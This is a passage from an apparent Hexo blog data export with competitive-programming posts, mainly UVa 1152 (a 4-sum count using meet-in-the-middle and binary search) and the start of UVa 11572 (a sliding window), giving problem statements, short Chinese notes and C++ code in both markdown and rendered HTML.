n; ++k)  </div><div class=\"line\">    &#123;  </div><div class=\"line\">        cur = <span class=\"number\">-1</span>, mr = N;  </div><div class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; ++i)  </div><div class=\"line\">            <span class=\"keyword\">if</span>(a[i] &lt; <span class=\"number\">0</span> &amp;&amp; l[i] &lt;= k &amp;&amp; r[i] &lt; mr)  </div><div class=\"line\">                mr = r[cur = i];  </div><div class=\"line\">        <span class=\"keyword\">if</span>(cur &lt; <span class=\"number\">0</span> || k &gt; mr)  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;  </div><div class=\"line\">        a[cur] = k;  </div><div class=\"line\">    &#125;  </div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;  </div><div class=\"line\">&#125;  </div><div class=\"line\">  </div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span>  </span></div><div class=\"line\">&#123;  </div><div class=\"line\">    <span class=\"keyword\">while</span>(~<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n), n)  </div><div class=\"line\">    &#123;  </div><div class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; ++i)  </div><div class=\"line\">            <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d%d%d\"</span>, &amp;xl[i], &amp;yl[i], &amp;xr[i], &amp;yr[i]);  </div><div class=\"line\">  </div><div class=\"line\">        <span class=\"keyword\">if</span>(solve(x, xl, xr) &amp;&amp; solve(y, yl, yr))  </div><div class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; ++i)  </div><div class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d %d\\n\"</span>, x[i], y[i]);  </div><div class=\"line\">        <span class=\"keyword\">else</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"IMPOSSIBLE\"</span>);  </div><div class=\"line\">    &#125;  </div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;  </div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"UVa 1152","date":"2017-03-21T07:57:28.000Z","_content":"\n## Description\n\n> The SUM problem can be formulated as follows: given four lists A, B, C, D of integer values, compute\nhow many quadruplet (a, b, c, d) ∈ A × B × C × D are such that a + b + c + d = 0. In the following, we\nassume that all lists have the same size n.\nInput\nThe input begins with a single positive integer on a line by itself indicating the number of the cases\nfollowing, each of them as described below. This line is followed by a blank line, and there is also a\nblank line between two consecutive inputs.\nThe first line of the input file contains the size of the lists n (this value can be as large as 4000).\nWe then have n lines containing four integer values (with absolute value as large as 228) that belong\nrespectively to A, B, C and D.\nOutput\nFor each test case, your program has to write the number quadruplets whose sum is zero.\nThe outputs of two consecutive cases will be separated by a blank line.\nSample Input\n1\n6\n-45 22 42 -16\n-41 -27 56 30\n-36 53 -37 77\n-36 30 -75 -46\n26 -38 -10 62\n-32 -54 -6 45\nSample Output\n5\nSample Explanation: Indeed, the sum of the five following quadruplets is zero: (-45, -27, 42, 30),\n(26, 30, -10, -46), (-32, 22, 56, -46), (-32, 30, -75, 77), (-32, -54, 56, 30).\n\n继续刷白书，人家的简单题，我还要5遍才AC，TAT。。。\n**中途相遇法**，先算a+b，再算c+d，然后用二分法查找。\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<string>\n#include<algorithm>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 4000;\n\nint n;\nint line;\nint a[maxN], b[maxN], c[maxN], d[maxN];\nint p[4000 * 4000], m[4000 * 4000];\nint cur = 0;\nint ans;\n\nint bs(int x, int y, int n)\n{\n\tint ans = 0;\n\tint mi;\n\tint up, low;\n\twhile (x < y)\n\t{\n\t\tmi = x + (y - x) / 2;\n\t\tif (m[mi] == n)\n\t\t{\n\t\t\tans++;\n\t\t\tup = low = mi;\n\t\t\twhile (m[++up] == n && up <= line * line - 1)\n\t\t\t{\n\t\t\t\tans++;\n\t\t\t}\n\t\t\twhile (m[--low] == n && low >= 0)\n\t\t\t{\n\t\t\t\tans++;\n\t\t\t}\n\t\t\treturn ans;\n\t\t}\n\t\telse if (m[mi] > n)\n\t\t\ty = mi;\n\t\telse\n\t\t\tx = mi + 1;\n\t}\n\treturn ans;\n}\n\nint main()\n{\n\tscanf(\"%d\", &n);\n\twhile (n--)\n\t{\n\t\tans = 0;\n\t\tcur = 0;\n\t\tgetchar();\n\t\tscanf(\"%d\", &line);\n\t\tfor (int i = 0; i < line; i++)\n\t\t\tscanf(\"%d%d%d%d\", &a[i], &b[i], &c[i], &d[i]);\n\t\tfor (int i = 0; i < line; i++)\n\t\t{\n\t\t\tfor (int j = 0; j < line; j++)\n\t\t\t{\n\t\t\t\tm[cur] = -(c[i] + d[j]);\n\t\t\t\tp[cur++] = a[i] + b[j];\n\t\t\t}\n\t\t}\n\t\tsort(p, p + line * line);\n\t\tsort(m, m + line * line);\n\t\tfor (int i = 0; i < line * line; i++)\n\t\t{\n\t\t\tans += bs(0, line * line, p[i]);\n\t\t}\n\t\tprintf(\"%d\\n\", ans);\n\t\tif (n)\n\t\t\tprintf(\"\\n\");\n\t}\n\treturn 0;\n}\n```\n","source":"_posts/UVa-1152.md","raw":"---\ntitle: UVa 1152\ntags:\n  - UVa\n  - 中途相遇法\ncategories: []\ndate: 2017-03-21 15:57:28\n---\n\n## Description\n\n> The SUM problem can be formulated as follows: given four lists A, B, C, D of integer values, compute\nhow many quadruplet (a, b, c, d) ∈ A × B × C × D are such that a + b + c + d = 0. In the following, we\nassume that all lists have the same size n.\nInput\nThe input begins with a single positive integer on a line by itself indicating the number of the cases\nfollowing, each of them as described below. This line is followed by a blank line, and there is also a\nblank line between two consecutive inputs.\nThe first line of the input file contains the size of the lists n (this value can be as large as 4000).\nWe then have n lines containing four integer values (with absolute value as large as 228) that belong\nrespectively to A, B, C and D.\nOutput\nFor each test case, your program has to write the number quadruplets whose sum is zero.\nThe outputs of two consecutive cases will be separated by a blank line.\nSample Input\n1\n6\n-45 22 42 -16\n-41 -27 56 30\n-36 53 -37 77\n-36 30 -75 -46\n26 -38 -10 62\n-32 -54 -6 45\nSample Output\n5\nSample Explanation: Indeed, the sum of the five following quadruplets is zero: (-45, -27, 42, 30),\n(26, 30, -10, -46), (-32, 22, 56, -46), (-32, 30, -75, 77), (-32, -54, 56, 30).\n\n继续刷白书，人家的简单题，我还要5遍才AC，TAT。。。\n**中途相遇法**，先算a+b，再算c+d，然后用二分法查找。\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<string>\n#include<algorithm>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 4000;\n\nint n;\nint line;\nint a[maxN], b[maxN], c[maxN], d[maxN];\nint p[4000 * 4000], m[4000 * 4000];\nint cur = 0;\nint ans;\n\nint bs(int x, int y, int n)\n{\n\tint ans = 0;\n\tint mi;\n\tint up, low;\n\twhile (x < y)\n\t{\n\t\tmi = x + (y - x) / 2;\n\t\tif (m[mi] == n)\n\t\t{\n\t\t\tans++;\n\t\t\tup = low = mi;\n\t\t\twhile (m[++up] == n && up <= line * line - 1)\n\t\t\t{\n\t\t\t\tans++;\n\t\t\t}\n\t\t\twhile (m[--low] == n && low >= 0)\n\t\t\t{\n\t\t\t\tans++;\n\t\t\t}\n\t\t\treturn ans;\n\t\t}\n\t\telse if (m[mi] > n)\n\t\t\ty = mi;\n\t\telse\n\t\t\tx = mi + 1;\n\t}\n\treturn ans;\n}\n\nint main()\n{\n\tscanf(\"%d\", &n);\n\twhile (n--)\n\t{\n\t\tans = 0;\n\t\tcur = 0;\n\t\tgetchar();\n\t\tscanf(\"%d\", &line);\n\t\tfor (int i = 0; i < line; i++)\n\t\t\tscanf(\"%d%d%d%d\", &a[i], &b[i], &c[i], &d[i]);\n\t\tfor (int i = 0; i < line; i++)\n\t\t{\n\t\t\tfor (int j = 0; j < line; j++)\n\t\t\t{\n\t\t\t\tm[cur] = -(c[i] + d[j]);\n\t\t\t\tp[cur++] = a[i] + b[j];\n\t\t\t}\n\t\t}\n\t\tsort(p, p + line * line);\n\t\tsort(m, m + line * line);\n\t\tfor (int i = 0; i < line * line; i++)\n\t\t{\n\t\t\tans += bs(0, line * line, p[i]);\n\t\t}\n\t\tprintf(\"%d\\n\", ans);\n\t\tif (n)\n\t\t\tprintf(\"\\n\");\n\t}\n\treturn 0;\n}\n```\n","slug":"UVa-1152","published":1,"updated":"2017-03-21T08:05:59.777Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k2a003mhv18cbpyy3o7","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>The SUM problem can be formulated as follows: given four lists A, B, C, D of integer values, compute<br>how many quadruplet (a, b, c, d) ∈ A × B × C × D are such that a + b + c + d = 0. In the following, we<br>assume that all lists have the same size n.<br>Input<br>The input begins with a single positive integer on a line by itself indicating the number of the cases<br>following, each of them as described below. This line is followed by a blank line, and there is also a<br>blank line between two consecutive inputs.<br>The first line of the input file contains the size of the lists n (this value can be as large as 4000).<br>We then have n lines containing four integer values (with absolute value as large as 228) that belong<br>respectively to A, B, C and D.<br>Output<br>For each test case, your program has to write the number quadruplets whose sum is zero.<br>The outputs of two consecutive cases will be separated by a blank line.<br>Sample Input<br>1<br>6<br>-45 22 42 -16<br>-41 -27 56 30<br>-36 53 -37 77<br>-36 30 -75 -46<br>26 -38 -10 62<br>-32 -54 -6 45<br>Sample Output<br>5<br>Sample Explanation: Indeed, the sum of the five following quadruplets is zero: (-45, -27, 42, 30),<br>(26, 30, -10, -46), (-32, 22, 56, -46), (-32, 30, -75, 77), (-32, -54, 56, 30).</p>\n</blockquote>\n<p>继续刷白书，人家的简单题，我还要5遍才AC，TAT。。。<br><strong>中途相遇法</strong>，先算a+b，再算c+d，然后用二分法查找。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">4000</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n;</div><div class=\"line\"><span class=\"keyword\">int</span> <span class=\"built_in\">line</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> a[maxN], b[maxN], c[maxN], d[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> p[<span class=\"number\">4000</span> * <span class=\"number\">4000</span>], m[<span class=\"number\">4000</span> * <span class=\"number\">4000</span>];</div><div class=\"line\"><span class=\"keyword\">int</span> cur = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> ans;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> bs(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y, <span class=\"keyword\">int</span> n)</div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> ans = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">int</span> mi;</div><div class=\"line\">\t<span class=\"keyword\">int</span> up, low;</div><div class=\"line\">\t<span class=\"built_in\">while</span> (x &lt; y)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tmi = x + (y - x) / <span class=\"number\">2</span>;</div><div class=\"line\">\t\t<span class=\"built_in\">if</span> (m[mi] == n)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tans++;</div><div class=\"line\">\t\t\tup = low = mi;</div><div class=\"line\">\t\t\t<span class=\"built_in\">while</span> (m[++up] == n &amp;&amp; up &lt;= <span class=\"built_in\">line</span> * <span class=\"built_in\">line</span> - <span class=\"number\">1</span>)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tans++;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"built_in\">while</span> (m[--low] == n &amp;&amp; low &gt;= <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tans++;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"built_in\">return</span> ans;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"built_in\">else</span> <span class=\"built_in\">if</span> (m[mi] &gt; n)</div><div class=\"line\">\t\t\ty = mi;</div><div class=\"line\">\t\t<span class=\"built_in\">else</span></div><div class=\"line\">\t\t\tx = mi + <span class=\"number\">1</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">return</span> ans;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> main()</div><div class=\"line\">&#123;</div><div class=\"line\">\tscanf(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\t<span class=\"built_in\">while</span> (n--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tans = <span class=\"number\">0</span>;</div><div class=\"line\">\t\tcur = <span class=\"number\">0</span>;</div><div class=\"line\">\t\tgetchar();</div><div class=\"line\">\t\tscanf(<span class=\"string\">\"%d\"</span>, &amp;<span class=\"built_in\">line</span>);</div><div class=\"line\">\t\t<span class=\"built_in\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"built_in\">line</span>; i++)</div><div class=\"line\">\t\t\tscanf(<span class=\"string\">\"%d%d%d%d\"</span>, &amp;a[i], &amp;b[i], &amp;c[i], &amp;d[i]);</div><div class=\"line\">\t\t<span class=\"built_in\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"built_in\">line</span>; i++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; <span class=\"built_in\">line</span>; j++)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tm[cur] = -(c[i] + d[j]);</div><div class=\"line\">\t\t\t\tp[cur++] = a[i] + b[j];</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\tsort(p, p + <span class=\"built_in\">line</span> * <span class=\"built_in\">line</span>);</div><div class=\"line\">\t\tsort(m, m + <span class=\"built_in\">line</span> * <span class=\"built_in\">line</span>);</div><div class=\"line\">\t\t<span class=\"built_in\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"built_in\">line</span> * <span class=\"built_in\">line</span>; i++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tans += bs(<span class=\"number\">0</span>, <span class=\"built_in\">line</span> * <span class=\"built_in\">line</span>, p[i]);</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\tprintf(<span class=\"string\">\"%d\\n\"</span>, ans);</div><div class=\"line\">\t\t<span class=\"built_in\">if</span> (n)</div><div class=\"line\">\t\t\tprintf(<span class=\"string\">\"\\n\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>The SUM problem can be formulated as follows: given four lists A, B, C, D of integer values, compute<br>how many quadruplet (a, b, c, d) ∈ A × B × C × D are such that a + b + c + d = 0. In the following, we<br>assume that all lists have the same size n.<br>Input<br>The input begins with a single positive integer on a line by itself indicating the number of the cases<br>following, each of them as described below. This line is followed by a blank line, and there is also a<br>blank line between two consecutive inputs.<br>The first line of the input file contains the size of the lists n (this value can be as large as 4000).<br>We then have n lines containing four integer values (with absolute value as large as 228) that belong<br>respectively to A, B, C and D.<br>Output<br>For each test case, your program has to write the number quadruplets whose sum is zero.<br>The outputs of two consecutive cases will be separated by a blank line.<br>Sample Input<br>1<br>6<br>-45 22 42 -16<br>-41 -27 56 30<br>-36 53 -37 77<br>-36 30 -75 -46<br>26 -38 -10 62<br>-32 -54 -6 45<br>Sample Output<br>5<br>Sample Explanation: Indeed, the sum of the five following quadruplets is zero: (-45, -27, 42, 30),<br>(26, 30, -10, -46), (-32, 22, 56, -46), (-32, 30, -75, 77), (-32, -54, 56, 30).</p>\n</blockquote>\n<p>继续刷白书，人家的简单题，我还要5遍才AC，TAT。。。<br><strong>中途相遇法</strong>，先算a+b，再算c+d，然后用二分法查找。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">4000</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n;</div><div class=\"line\"><span class=\"keyword\">int</span> <span class=\"built_in\">line</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> a[maxN], b[maxN], c[maxN], d[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> p[<span class=\"number\">4000</span> * <span class=\"number\">4000</span>], m[<span class=\"number\">4000</span> * <span class=\"number\">4000</span>];</div><div class=\"line\"><span class=\"keyword\">int</span> cur = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> ans;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> bs(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y, <span class=\"keyword\">int</span> n)</div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> ans = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">int</span> mi;</div><div class=\"line\">\t<span class=\"keyword\">int</span> up, low;</div><div class=\"line\">\t<span class=\"built_in\">while</span> (x &lt; y)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tmi = x + (y - x) / <span class=\"number\">2</span>;</div><div class=\"line\">\t\t<span class=\"built_in\">if</span> (m[mi] == n)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tans++;</div><div class=\"line\">\t\t\tup = low = mi;</div><div class=\"line\">\t\t\t<span class=\"built_in\">while</span> (m[++up] == n &amp;&amp; up &lt;= <span class=\"built_in\">line</span> * <span class=\"built_in\">line</span> - <span class=\"number\">1</span>)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tans++;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"built_in\">while</span> (m[--low] == n &amp;&amp; low &gt;= <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tans++;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"built_in\">return</span> ans;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"built_in\">else</span> <span class=\"built_in\">if</span> (m[mi] &gt; n)</div><div class=\"line\">\t\t\ty = mi;</div><div class=\"line\">\t\t<span class=\"built_in\">else</span></div><div class=\"line\">\t\t\tx = mi + <span class=\"number\">1</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">return</span> ans;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> main()</div><div class=\"line\">&#123;</div><div class=\"line\">\tscanf(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\t<span class=\"built_in\">while</span> (n--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tans = <span class=\"number\">0</span>;</div><div class=\"line\">\t\tcur = <span class=\"number\">0</span>;</div><div class=\"line\">\t\tgetchar();</div><div class=\"line\">\t\tscanf(<span class=\"string\">\"%d\"</span>, &amp;<span class=\"built_in\">line</span>);</div><div class=\"line\">\t\t<span class=\"built_in\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"built_in\">line</span>; i++)</div><div class=\"line\">\t\t\tscanf(<span class=\"string\">\"%d%d%d%d\"</span>, &amp;a[i], &amp;b[i], &amp;c[i], &amp;d[i]);</div><div class=\"line\">\t\t<span class=\"built_in\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"built_in\">line</span>; i++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; <span class=\"built_in\">line</span>; j++)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tm[cur] = -(c[i] + d[j]);</div><div class=\"line\">\t\t\t\tp[cur++] = a[i] + b[j];</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\tsort(p, p + <span class=\"built_in\">line</span> * <span class=\"built_in\">line</span>);</div><div class=\"line\">\t\tsort(m, m + <span class=\"built_in\">line</span> * <span class=\"built_in\">line</span>);</div><div class=\"line\">\t\t<span class=\"built_in\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"built_in\">line</span> * <span class=\"built_in\">line</span>; i++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tans += bs(<span class=\"number\">0</span>, <span class=\"built_in\">line</span> * <span class=\"built_in\">line</span>, p[i]);</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\tprintf(<span class=\"string\">\"%d\\n\"</span>, ans);</div><div class=\"line\">\t\t<span class=\"built_in\">if</span> (n)</div><div class=\"line\">\t\t\tprintf(<span class=\"string\">\"\\n\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n"},{"title":"UVa 11572","date":"2017-03-24T05:36:17.000Z","_content":"\n## Description\n\n> Emily the entrepreneur has a cool business idea: packaging and selling snowflakes. She has devised a\nmachine that captures snowflakes as they fall, and serializes them into a stream of snowflakes that flow,\none by one, into a package. Once the package is full, it is closed and shipped to be sold.\nThe marketing motto for the company is “bags of uniqueness.” To live up to the motto, every\nsnowflake in a package must be different from the others. Unfortunately, this is easier said than done,\nbecause in reality, many of the snowflakes flowing through the machine are identical. Emily would like\nto know the size of the largest possible package of unique snowflakes that can be created. The machine\ncan start filling the package at any time, but once it starts, all snowflakes flowing from the machine\nmust go into the package until the package is completed and sealed. The package can be completed\nand sealed before all of the snowflakes have flowed out of the machine.\nInput\nThe first line of input contains one integer specifying the number of test cases to follow. Each test\ncase begins with a line containing an integer n, the number of snowflakes processed by the machine.\nThe following n lines each contain an integer (in the range 0 to 109\n, inclusive) uniquely identifying a\nsnowflake. Two snowflakes are identified by the same integer if and only if they are identical.\nThe input will contain no more than one million total snowflakes.\nOutput\nFor each test case output a line containing single integer, the maximum number of unique snowflakes\nthat can be in a package.\nSample Input\n1\n5\n1\n2\n3\n2\n1\nSample Output\n3\n\n最后写来写去，写成了树上的样子。。\n滑动窗口的简单实例\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<string>\n#include<algorithm>\n#include<set>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 1e7 + 10;\n\nint n, m;\nint a[maxN];\n\nint main()\n{\n\tscanf(\"%d\", &n);\n\twhile (n--)\n\t{\n\t\tscanf(\"%d\", &m);\n\t\tfor (int i = 0; i < m; i++)\n\t\t\tscanf(\"%d\", &a[i]);\n\t\tset<int> s;\n\t\tint L = 0, R = 0, ans = 0;\n\t\twhile (R < m)\n\t\t{\n\t\t\twhile (R < m && !s.count(a[R]))\n\t\t\t\ts.insert(a[R++]);\n\t\t\tans = max(ans, R - L);\n\t\t\ts.erase(a[L++]);\n\t\t}\n\t\tprintf(\"%d\\n\", ans);\n\t}\n\treturn 0;\n}\n```","source":"_posts/UVa-11572.md","raw":"---\ntitle: UVa 11572\ntags:\n  - UVa\n  - 滑动窗口\ncategories: []\ndate: 2017-03-24 13:36:17\n---\n\n## Description\n\n> Emily the entrepreneur 